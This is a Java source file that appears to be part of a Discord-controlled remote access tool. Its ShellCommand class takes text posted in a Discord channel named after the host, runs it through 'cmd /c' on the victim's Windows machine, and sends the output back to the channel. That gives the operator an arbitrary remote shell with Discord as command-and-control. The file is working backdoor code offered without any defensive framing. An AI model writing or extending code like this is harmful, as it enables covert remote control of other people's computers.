package me.vasler.command.impl;

import me.vasler.Main;
import me.vasler.command.Command;
import java.io.BufferedReader;
import java.io.InputStreamReader;

import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;

public class ShellCommand
extends Command {
    public ShellCommand() {
        super(new String[]{"runcmd", "runcommand", "runshell", "shell", "terminal"});
    }

    @Override
    public void run(String[] args, TextChannel channel) {
        if (!channel.getName().equalsIgnoreCase(Main.name)) {
            return;
        }
        StringBuilder command = new StringBuilder();
        for (int i = 1; i < args.length; ++i) {
            command.append(" ").append(args[i]);
        }
        try {
            String s;
            Runtime rt = Runtime.getRuntime();
            Process proc = rt.exec("cmd /c " + command);
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
            StringBuilder output = new StringBuilder();
            while ((s = stdInput.readLine()) != null) {
                output.append("\n").append(s);
            }
            while ((s = stdError.readLine()) != null) {
                output.append("\n").append(s);
            }
            if (output.toString().isEmpty()) {
                channel.sendMessage("Command executed successfully! No output was provided").queue();
                return;
            }
            try {
                channel.sendMessage(output.toString()).queue();
            }
            catch (Exception e) {
                channel.sendMessage("Output too big for discord!").queue();
            }
        }
        catch (Exception e) {
            channel.sendMessage(e.toString()).queue();
        }
    }
}

